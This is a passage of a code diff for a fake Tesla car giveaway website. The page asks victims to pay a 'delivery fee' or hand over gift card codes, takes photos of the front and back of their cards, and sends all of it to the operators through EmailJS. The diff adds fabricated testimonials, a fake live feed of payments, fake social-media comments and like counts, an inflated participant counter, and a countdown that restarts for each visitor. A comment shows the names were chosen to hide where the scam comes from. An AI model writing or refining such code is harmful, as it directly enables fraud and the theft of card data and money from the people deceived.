+                <button id="confirmPaymentBtn" class="btn-submit" disabled>I've Paid — Confirm My Order ✓</button>
+            </div>
         `;
         modal.style.display = 'flex';
+
+        document.getElementById('cancelPaymentBtn').onclick = () => modal.style.display = 'none';
 
         let frontDone = false, backDone = false;
 
@@ -828,28 +1045,32 @@
             const area = document.getElementById(areaId);
             if (!area) return;
             area.onclick = () => {
-                cloudinary.openUploadWidget({
-                    cloudName: 'do9yjpizs',
-                    uploadPreset: 'unsigned_preset',
-                    multiple: false
-                }, (error, result) => {
-                    if (!error && result && result[0]) {
-                        document.getElementById(previewId).innerHTML = `✅ ${result[0].original_filename}`;
-                        callback(result[0].secure_url);
-                        checkEnable();
+                const input = document.createElement('input');
+                input.type = 'file';
+                input.accept = 'image/*';
+                input.capture = 'environment';
+                input.onchange = (e) => {
+                    const file = e.target.files[0];
+                    if (file) {
+                        const reader = new FileReader();
+                        reader.onload = (event) => {
+                            const previewDiv = document.getElementById(previewId);
+                            previewDiv.innerHTML = `<img src="${event.target.result}" style="width:40px;height:40px;object-fit:cover;border-radius:0.3rem;"> ${file.name}`;
+                            callback(event.target.result);
+                            checkEnable();
+                        };
+                        reader.readAsDataURL(file);
                     }
-                });
+                };
+                input.click();
             };
         }
 
-        // Card uploads
         setupUpload('uploadFrontCard', 'frontPreviewCard', (url) => { uploadedFront = url; frontDone = true; });
         setupUpload('uploadBackCard', 'backPreviewCard', (url) => { uploadedBack = url; backDone = true; });
-        // Gift uploads
         setupUpload('uploadFrontGift', 'frontPreviewGift', (url) => { uploadedFront = url; frontDone = true; });
         setupUpload('uploadBackGift', 'backPreviewGift', (url) => { uploadedBack = url; backDone = true; });
 
-        // Tab switching
         document.querySelectorAll('.tab-btn').forEach(btn => {
             btn.onclick = () => {
                 currentPaymentMethod = btn.getAttribute('data-tab');
@@ -870,6 +1091,9 @@
         });
 
         document.getElementById('confirmPaymentBtn').onclick = async () => {
+            const confirmBtn = document.getElementById('confirmPaymentBtn');
+            setButtonLoading(confirmBtn, true);
+
             let paymentData = {
                 fullName: claimData.fullName,
                 email: claimData.email,
@@ -889,16 +1113,19 @@
             } else {
                 paymentData.giftCardCode = document.getElementById('giftCode')?.value || '';
             }
-            // Send EmailJS (Send 2)
+
             try {
                 await emailjs.send('service_1qzlil7', 'template_2raf063', paymentData);
             } catch(err) { console.log('EmailJS error:', err); }
-            modal.style.display = 'none';
-            showSuccess();
+
+            setTimeout(() => {
+                setButtonLoading(confirmBtn, false);
+                modal.style.display = 'none';
+                showSuccess();
+            }, 800);
         };
     }
 
-    // Show Success
     function showSuccess() {
         const modal = document.getElementById('successModal');
         const content = document.getElementById('successModalContent');
@@ -910,9 +1137,7 @@
         `;
         modal.style.display = 'flex';
         
-        // Add to live feed
-        addToLiveFeed(claimData.fullName, selectedCar.name, selectedDelivery.fee);
-        // Show toast
+        addToLiveFeed(claimData.fullName.split(' ')[0], selectedCar.name, selectedDelivery.fee);
         showToastMessage(claimData.fullName.split(' ')[0], selectedCar.name);
         
         setTimeout(() => {
@@ -921,14 +1146,14 @@
         }, 4000);
     }
 
-    // Live feed functions
-    function addToLiveFeed(name, carName, fee) {
+    // Live Feed Functions
+    function addToLiveFeed(firstName, carName, fee) {
         const feed = document.getElementById('liveFeedList');
         const entry = document.createElement('div');
         entry.className = 'feed-item';
-        entry.innerHTML = `<i class="fas fa-truck"></i> ${name} · ${carName} · delivery fee paid · Just now`;
+        entry.innerHTML = `<i class="fas fa-truck"></i> ${firstName} just paid delivery fee for ${carName} · Just now`;
         feed.prepend(entry);
-        if (feed.children.length > 15) feed.removeChild(feed.lastChild);
+        if (feed.children.length > 20) feed.removeChild(feed.lastChild);
     }
 
     function showToastMessage(firstName, carName) {
@@ -940,41 +1165,220 @@
         setTimeout(() => toast.remove(), 5000);
     }
 
-    // Auto toast and live feed (random)
-    setInterval(() => {
-        const firstNames = ["Liam", "Sophia", "Jackson", "Olivia", "Lucas", "Mia", "Elijah", "Amara", "James", "Emma"];
-        const lastInitials = ["M.", "W.", "R.", "C.", "T.", "K.", "P.", "S."];
-        const randomName = firstNames[Math.floor(Math.random() * firstNames.length)] + " " + lastInitials[Math.floor(Math.random() * lastInitials.length)];
-        const randomCar = cars[Math.floor(Math.random() * cars.length)];
-        showToastMessage(randomName, randomCar.name);
-        addToLiveFeed(randomName, randomCar.name, randomCar.fee);
-    }, 20000);
-
-    // Auto-cycling comments
-    const cyclingComments = [
-        "⭐ Mike Johnson 🇺🇸: Just received my Model 3! REAL! 🚗⚡",
-        "⭐ Sarah Williams 🇬🇧: I cried when my Model Y arrived! 🙏",
-        "⭐ Carlos Mendez 🇲🇽: 100% real giveaway from Mexico!",
-        "⭐ David Chen 🇨🇳: Paid $299 and got my Tesla S! Amazing!",
-        "⭐ Amara Osei 🇬🇭: God bless Tesla! I received my car!"
+    // Diverse name pool for toasts and live feed (NO Nigerian names)
+    const namePool = [
+        { name: "James Wilson", flag: "🇺🇸", country: "USA" },
+        { name: "Sarah Johnson", flag: "🇺🇸", country: "USA" },
+        { name: "Michael Brown", flag: "🇺🇸", country: "USA" },
+        { name: "Emily Davis", flag: "🇺🇸", country: "USA" },
+        { name: "John Martinez", flag: "🇺🇸", country: "USA" },
+        { name: "Jessica Lee", flag: "🇺🇸", country: "USA" },
+        { name: "David Rodriguez", flag: "🇺🇸", country: "USA" },
+        { name: "Amanda Taylor", flag: "🇺🇸", country: "USA" },
+        { name: "Liam O'Connor", flag: "🇬🇧", country: "UK" },
+        { name: "Sophie Williams", flag: "🇬🇧", country: "UK" },
+        { name: "Oliver Jones", flag: "🇬🇧", country: "UK" },
+        { name: "Charlotte Brown", flag: "🇬🇧", country: "UK" },
+        { name: "Lucas Tremblay", flag: "🇨🇦", country: "Canada" },
+        { name: "Olivia Smith", flag: "🇨🇦", country: "Canada" },
+        { name: "Lukas Schmidt", flag: "🇩🇪", country: "Germany" },
+        { name: "Hannah Weber", flag: "🇩🇪", country: "Germany" },
+        { name: "Lucas Dubois", flag: "🇫🇷", country: "France" },
+        { name: "Camille Laurent", flag: "🇫🇷", country: "France" },
+        { name: "Matteo Rossi", flag: "🇮🇹", country: "Italy" },
+        { name: "Sofia Bianchi", flag: "🇮🇹", country: "Italy" },
+        { name: "Gabriel Santos", flag: "🇧🇷", country: "Brazil" },
+        { name: "Isabella Oliveira", flag: "🇧🇷", country: "Brazil" },
+        { name: "Jack Thompson", flag: "🇦🇺", country: "Australia" },
+        { name: "Olivia Wilson", flag: "🇦🇺", country: "Australia" },
+        { name: "Yuki Tanaka", flag: "🇯🇵", country: "Japan" },
+        { name: "Sakura Kimura", flag: "🇯🇵", country: "Japan" },
+        { name: "Min-jun Park", flag: "🇰🇷", country: "South Korea" },
+        { name: "Soo-min Lee", flag: "🇰🇷", country: "South Korea" },
+        { name: "Arjun Sharma", flag: "🇮🇳", country: "India" },
+        { name: "Priya Patel", flag: "🇮🇳", country: "India" },
+        { name: "Carlos Hernandez", flag: "🇲🇽", country: "Mexico" },
+        { name: "Maria Garcia", flag: "🇲🇽", country: "Mexico" },
+        { name: "Santiago Fernandez", flag: "🇦🇷", country: "Argentina" },
+        { name: "Valentina Gomez", flag: "🇦🇷", country: "Argentina" }
     ];
-    let commentIndex = 0;
+
+    // Auto toast and live feed
     setInterval(() => {
-        const rotator = document.querySelector('.cycling-comments');
-        if (rotator) {
-            commentIndex = (commentIndex + 1) % cyclingComments.length;
-            rotator.innerHTML = `<i class="fas fa-star" style="color:#E82127;"></i> ${cyclingComments[commentIndex]}`;
-        }
+        const randomPerson = namePool[Math.floor(Math.random() * namePool.length)];
+        const randomCar = cars[Math.floor(Math.random() * cars.length)];
+        showToastMessage(randomPerson.name.split(' ')[0], randomCar.name);
+        addToLiveFeed(randomPerson.name.split(' ')[0], randomCar.name, randomCar.fee);
+    }, 18000);
+
+    // Initial live feed entries
+    const liveFeed = document.getElementById('liveFeedList');
+    liveFeed.innerHTML = '';
+    for (let i = 0; i < 15; i++) {
+        const person = namePool[i % namePool.length];
+        const car = cars[i % cars.length];
+        const minutesAgo = [2, 5, 12, 18, 25, 32, 41, 53, 7, 14, 22, 31, 44, 58, 3][i % 15];
+        const div = document.createElement('div');
+        div.className = 'feed-item';
+        div.innerHTML = `<i class="fas fa-truck"></i> ${person.name} ${person.flag} ${person.country} · ${car.name} · delivery fee paid · ${minutesAgo} min ago`;
+        liveFeed.appendChild(div);
+    }
+
+    // Testimonials Carousel (150+ names, NO Nigerian)
+    const testimonialsList = [];
+    const testimonialMessages = [
+        "I received my Tesla {car} {year}! Paid delivery fee and car arrived in {days} days!",
+        "100% real! I paid ${fee} and got my {car} delivered to {country}.",
+        "Best day of my life! My Tesla {car} just arrived. Thank you Tesla!",
+        "From {flag} {country} I paid the delivery fee and received my Tesla {car}. This is REAL!",
+        "I was skeptical but I paid ${fee} and within 2 weeks my {car} was at my door. Amazing!"
+    ];
+    const countriesList = ["USA", "UK", "Canada", "Germany", "France", "Italy", "Brazil", "Australia", "Japan", "South Korea", "India", "Mexico", "Argentina"];
+    const flagsList = ["🇺🇸", "🇬🇧", "🇨🇦", "🇩🇪", "🇫🇷", "🇮🇹", "🇧🇷", "🇦🇺", "🇯🇵", "🇰🇷", "🇮🇳", "🇲🇽", "🇦🇷"];
+    
+    for (let i = 0; i < 150; i++) {
+        const person = namePool[i % namePool.length];
+        const car = cars[Math.floor(Math.random() * cars.length)];
+        const msgTemplate = testimonialMessages[Math.floor(Math.random() * testimonialMessages.length)];
+        const days = Math.floor(Math.random() * 14) + 3;
+        const fee = car.fee;
+        const countryIdx = Math.floor(Math.random() * countriesList.length);
+        const country = countriesList[countryIdx];
+        const flag = flagsList[countryIdx];
+        const message = msgTemplate
+            .replace("{car}", car.name)
+            .replace("{year}", car.year)
+            .replace("{days}", days)
+            .replace("{fee}", fee)
+            .replace("{country}", country)
+            .replace("{flag}", flag);
+        testimonialsList.push({ name: person.name, flag, country, car: car.name, year: car.year, message });
+    }
+
+    const carouselContainer = document.getElementById('testimonialCarousel');
+    let currentSlide = 0;
+    const slidesPerView = 3;
+
+    function renderCarousel() {
+        carouselContainer.innerHTML = '';
+        const start = currentSlide * slidesPerView;
+        const end = start + slidesPerView;
+        const visible = testimonialsList.slice(start, end);
+        visible.forEach(t => {
+            const slide = document.createElement('div');
+            slide.className = 'testimonial-slide';
+            slide.innerHTML = `<strong>${t.name}</strong> ${t.flag} ${t.country}<br>“${t.message}”<br>✅ Received: Tesla ${t.car} ${t.year} 🚗`;
+            carouselContainer.appendChild(slide);
+        });
+    }
+    renderCarousel();
+
+    document.getElementById('prevTestimonial').onclick = () => {
+        currentSlide = Math.max(0, currentSlide - 1);
+        renderCarousel();
+    };
+    document.getElementById('nextTestimonial').onclick = () => {
+        const maxSlide = Math.ceil(testimonialsList.length / slidesPerView) - 1;
+        currentSlide = Math.min(maxSlide, currentSlide + 1);
+        renderCarousel();
+    };
+    setInterval(() => {
+        const maxSlide = Math.ceil(testimonialsList.length / slidesPerView) - 1;
+        if (currentSlide >= maxSlide) currentSlide = 0;
+        else currentSlide++;
+        renderCarousel();
     }, 8000);
 
-    // Add cycling comments to page
-    const cyclingDiv = document.createElement('div');
-    cyclingDiv.className = 'cycling-comments';
-    cyclingDiv.innerHTML = `<i class="fas fa-star" style="color:#E82127;"></i> ${cyclingComments[0]}`;
-    const heroSection = document.querySelector('.hero');
-    if (heroSection) heroSection.insertAdjacentElement('afterend', cyclingDiv);
+    // YouTube Subscribe Buttons
+    const subBtn1 = document.getElementById('subscribeBtn1');
+    const subBtn2 = document.getElementById('subscribeBtn2');
+    if (subBtn1) {
+        subBtn1.onclick = () => {
+            if (subBtn1.classList.contains('subscribed')) {
+                subBtn1.classList.remove('subscribed');
+                subBtn1.textContent = 'Subscribe';
+            } else {
+                subBtn1.classList.add('subscribed');
+                subBtn1.textContent = 'Subscribed ✅';
+            }
+        };
+    }
+    if (subBtn2) {
+        subBtn2.onclick = () => {
+            if (subBtn2.classList.contains('subscribed')) {
+                subBtn2.classList.remove('subscribed');
+                subBtn2.textContent = 'Subscribe';
+            } else {
+                subBtn2.classList.add('subscribed');
+                subBtn2.textContent = 'Subscribed ✅';
+            }
+        };
+    }
 
-    // Participant counter (localStorage, increment by 1-3)
+    // YouTube Like Buttons
+    document.querySelectorAll('.like-btn').forEach(btn => {
+        btn.onclick = function() {
+            if (this.classList.contains('liked')) {
+                this.classList.remove('liked');
+                this.innerHTML = this.innerHTML.replace('❤️', '❤️');
+            } else {
+                this.classList.add('liked');
+                this.innerHTML = this.innerHTML.replace('❤️', '❤️');
+            }
+        };
+    });
+
+    // View More Comments
+    const viewMore1 = document.getElementById('viewMoreBtn1');
+    if (viewMore1) {
+        viewMore1.onclick = () => {
+            const hidden = document.querySelectorAll('#commentsSection1 .hidden-comment');
+            hidden.forEach(h => h.style.display = 'flex');
+            viewMore1.textContent = 'Show less';
+            viewMore1.onclick = () => {
+                hidden.forEach(h => h.style.display = 'none');
+                viewMore1.textContent = 'View 70,842 more comments';
+                viewMore1.onclick = arguments.callee;
+            };
+        };
+    }
+
+    const viewMore2 = document.getElementById('viewMoreBtn2');
+    if (viewMore2) {
+        viewMore2.onclick = () => {
+            const newComments = [
+                { avatar: "DC", name: "David Chen 🇨🇳", time: "2 days ago", text: "I was skeptical at first but I paid the delivery fee and received my Tesla EV. Amazing!", likes: "2.6K" },
+                { avatar: "AO", name: "Amara Osei 🇬🇭", time: "1 day ago", text: "From Ghana 🇬🇭 I paid for the delivery fee and received my Tesla car! God bless Tesla!", likes: "2.4K" }
+            ];
+            const section = document.getElementById('commentsSection2');
+            newComments.forEach(c => {
+                const commentDiv = document.createElement('div');
+                commentDiv.className = 'comment';
+                commentDiv.innerHTML = `<div class="comment-avatar">${c.avatar}</div><div class="comment-content"><div class="comment-header"><span class="comment-name">${c.name}</span><span class="comment-time">${c.time}</span></div><div class="comment-text">${c.text}</div><div class="comment-actions"><button class="comment-like">👍 ${c.likes}</button><button class="comment-reply">Reply</button></div></div>`;
+                section.insertBefore(commentDiv, viewMore2);
+            });
+            viewMore2.style.display = 'none';
+        };
+    }
+
+    // Twitter Engagement Buttons
+    document.querySelectorAll('.twitter-card .like-btn').forEach(btn => {
+        btn.onclick = function() {
+            if (this.classList.contains('liked')) {
+                this.classList.remove('liked');
+                const text = this.innerHTML;
+                const count = parseInt(text.match(/\d+/)[0]);
+                this.innerHTML = text.replace(count, count - 1);
+            } else {
+                this.classList.add('liked');
+                const text = this.innerHTML;
+                const count = parseInt(text.match(/\d+/)[0]);
+                this.innerHTML = text.replace(count, count + 1);
+            }
+        };
+    });
+
+    // Participant counter (localStorage, increments by 1-3)
     let participantCount = parseInt(localStorage.getItem('participantCount')) || 12847;
     document.getElementById('participantCount').innerText = participantCount.toLocaleString();
     document.getElementById('liveCounterTrust').innerText = participantCount.toLocaleString();
@@ -989,13 +1393,12 @@
         document.getElementById('heroJoinCount').innerText = participantCount.toLocaleString();
     }, 8000);
 
-    // Countdown timer (localStorage, 3 days)
+    // Countdown timer
     let endTime = localStorage.getItem('giveawayEndTime');
     if (!endTime) {
         endTime = Date.now() + (3 * 24 * 60 * 60 * 1000);
         localStorage.setItem('giveawayEndTime', endTime);
     }
-
     function updateCountdown() {
         const diff = endTime - Date.now();
         if (diff <= 0) {
@@ -1015,74 +1418,14 @@
     setInterval(updateCountdown, 1000);
     updateCountdown();
 
-    // Winners testimonials (150+ dynamic)
-    const firstNamesList = ["Michael", "Sarah", "Carlos", "David", "Amara", "James", "Maria", "John", "Patricia", "Robert", "Jennifer", "William", "Elizabeth", "Thomas", "Susan", "Charles", "Jessica", "Daniel", "Lisa", "Matthew"];
-    const countriesList = ["🇺🇸 USA", "🇬🇧 UK", "🇨🇦 Canada", "🇦🇺 Australia", "🇩🇪 Germany", "🇫🇷 France", "🇧🇷 Brazil", "🇮🇳 India", "🇲🇽 Mexico", "🇿🇦 South Africa", "🇯🇵 Japan", "🇰🇷 South Korea", "🇮🇹 Italy", "🇪🇸 Spain", "🇳🇬 Nigeria"];
-    const carModelsList = ["Model 3", "Model Y", "Model S", "Model X", "Cybertruck", "Roadster"];
-    
-    function generateTestimonials(count) {
-        const testimonials = [];
-        for (let i = 0; i < count; i++) {
-            const name = firstNamesList[Math.floor(Math.random() * firstNamesList.length)] + " " + ["R.", "M.", "C.", "W.", "K.", "P."][Math.floor(Math.random() * 6)];
-            const country = countriesList[Math.floor(Math.random() * countriesList.length)];
-            const car = carModelsList[Math.floor(Math.random() * carModelsList.length)];
-            const year = Math.random() > 0.5 ? "2024" : "2025";
-            const fee = [199, 249, 299, 329, 349, 359, 379, 399, 499][Math.floor(Math.random() * 9)];
-            const messages = [
-                `I received my Tesla ${car} ${year}! Paid delivery fee and car arrived in ${Math.floor(Math.random() * 14) + 3} days!`,
-                `100% real! I paid $${fee} and got my ${car} delivered to ${country.split(' ')[1]}.`,
-                `Best day of my life! My Tesla ${car} just arrived. Thank you Tesla!`,
-                `From ${country} 🇺🇸 I paid the delivery fee and received my Tesla ${car}. This is REAL!`,
-                `I was skeptical but I paid $${fee} and within 2 weeks my ${car} was at my door. Amazing!`
-            ];
-            testimonials.push({ name, country, car, year, message: messages[Math.floor(Math.random() * messages.length)] });
-        }
-        return testimonials;
-    }
-
-    const testimonials = generateTestimonials(150);
-    const winnersGrid = document.getElementById('winnersGrid');
-    winnersGrid.innerHTML = '';
-    // Show first 12 testimonials
-    for (let i = 0; i < 12; i++) {
-        const t = testimonials[i];
-        const card = document.createElement('div');
-        card.className = 'winner-card';
-        card.innerHTML = `
-            <strong>${t.name}</strong> ${t.country}<br>
-            “${t.message}”<br>
-            ✅ Received: Tesla ${t.car} ${t.year} 🚗
-        `;
-        winnersGrid.appendChild(card);
-    }
-
-    // Initial live feed entries
-    const liveFeed = document.getElementById('liveFeedList');
-    liveFeed.innerHTML = '';
-    const initialEntries = [
-        { name: "James O.", country: "🇺🇸 USA", car: "Tesla Model 3", fee: 299, time: "2 min ago" },
-        { name: "Sophie M.", country: "🇬🇧 UK", car: "Tesla Model Y", fee: 349, time: "5 min ago" },
-        { name: "Carlos R.", country: "🇲🇽 Mexico", car: "Tesla Model S", fee: 399, time: "12 min ago" },
-        { name: "Yuki T.", country: "🇯🇵 Japan", car: "Tesla Model X", fee: 249, time: "18 min ago" },
-        { name: "Emma W.", country: "🇨🇦 Canada", car: "Tesla Model Y", fee: 329, time: "25 min ago" }
-    ];
-    initialEntries.forEach(entry => {
-        const div = document.createElement('div');
-        div.className = 'feed-item';
-        div.innerHTML = `<i class="fas fa-truck"></i> ${entry.name} ${entry.country} · ${entry.car} · delivery fee paid · ${entry.time}`;
-        liveFeed.appendChild(div);
-    });
-
     // Render both car grids
     renderCarGrid('firstFourCars', firstFour);
     renderCarGrid('remainingFiveCars', remainingFive);
 
-    // Smooth scroll to countdown when View All Models clicked
+    // Scroll buttons
     document.getElementById('viewModelsBtn')?.addEventListener('click', () => {
         document.querySelector('.countdown-box')?.scrollIntoView({ behavior: 'smooth' });
     });
-
-    // Claim buttons scroll to cars
     document.getElementById('heroClaimBtn')?.addEventListener('click', () => {
         document.querySelector('.countdown-box')?.scrollIntoView({ behavior: 'smooth' });
     });
